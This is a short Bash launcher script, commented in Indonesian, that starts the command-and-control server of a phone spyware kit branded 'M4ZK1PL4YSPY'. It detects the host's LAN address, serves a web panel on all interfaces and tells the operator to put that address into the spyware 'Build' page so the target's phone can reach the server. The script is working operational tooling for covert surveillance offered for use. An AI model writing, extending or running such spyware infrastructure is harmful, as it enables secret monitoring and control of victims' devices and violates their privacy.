#!/usr/bin/env bash
# Jalankan C2. Linux · macOS · Termux.
set -euo pipefail

R='\033[1;31m'; A='\033[1;33m'; C='\033[1;36m'; N='\033[0m'
cd "$(dirname "$0")"

if [[ ! -d .venv ]]; then
  echo -e "${R}[M4ZK1PLAY]${N} .venv belum ada. Jalankan ./install.sh dulu."
  exit 1
fi

# shellcheck disable=SC1091
source .venv/bin/activate

PORT="$(python - <<'PYEOF'
import json
try:
    print(json.load(open("config.json")).get("port", 8777))
except Exception:
    print(8777)
PYEOF
)"

LAN=""
if command -v ip >/dev/null 2>&1; then
  LAN="$(ip -4 route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}' || true)"
elif command -v ifconfig >/dev/null 2>&1; then
  LAN="$(ifconfig 2>/dev/null | awk '/inet /{print $2; exit}' || true)"
fi

echo -e "${R}╔════════════════════════════════════════════════════╗${N}"
echo -e "${R}║${N}  M4ZK1PL4YSPY C2                                  ${R}║${N}"
echo -e "${R}╚════════════════════════════════════════════════════╝${N}"
echo
echo -e "  Lokal   : ${C}http://127.0.0.1:${PORT}${N}"
[[ -n "$LAN" ]] && echo -e "  LAN     : ${C}http://${LAN}:${PORT}${N}"
echo -e "  Lisensi : ${A}M4ZK1PL4Y${N}"
echo -e "  Stop    : ${A}CTRL+C${N}"
echo
echo -e "${A}Penting:${N} isi URL C2 di halaman Build dengan alamat LAN di atas,"
echo "         bukan 127.0.0.1 — HP target harus bisa menjangkau server."
echo

exec uvicorn server.main:app --host 0.0.0.0 --port "$PORT"
